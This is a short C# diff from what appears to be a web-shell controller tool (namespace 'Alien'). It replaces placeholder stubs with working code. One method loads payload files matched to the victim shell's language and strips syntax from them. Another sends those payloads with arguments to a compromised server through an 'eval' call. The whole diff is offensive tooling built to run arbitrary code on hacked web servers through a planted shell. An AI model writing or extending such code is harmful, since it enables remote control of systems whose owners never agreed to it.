@@ -98,10 +98,18 @@ namespace Alien
                 return m_szEnvironment;
             }
 
-            public string fnGetPayload(string szEnvironment)
+            public string fnGetPayload(string szDirName, string szEnv, string szName)
             {
-                MessageBox.Show(szEnvironment);
-                return "phpinfo();";
+                string szPayloadPath = Path.Combine(szDirName, "payloads", szEnv, $"{szName}.{clsWeb.m_dicSuffix[m_web.m_victim.ShellLanguage]}").Replace("/", "\\");
+                if (!File.Exists(szPayloadPath))
+                    return string.Empty;
+
+                string szPayload = File.ReadAllText(szPayloadPath);
+
+                foreach (string s in clsWeb.m_dicRemoveSyntax[m_web.m_victim.ShellLanguage])
+                    szPayload = szPayload.Replace(s, string.Empty);
+
+                return szPayload;
             }
 
             public string fnReadFileText(string szFilePath)
@@ -122,8 +130,9 @@ namespace Alien
 
             public async Task<string> fnRun(string szJson, string szPayload, string szEnvironment)
             {
-                //return await m_web.fnszSendPayload("plugin", new string[] { szPayload, szJson });
-                return "AAA";
+                string szResp = await m_web.fnszSendPayload("eval", new string[] { szPayload, szJson });
+
+                return szResp;
             }
         }
     }
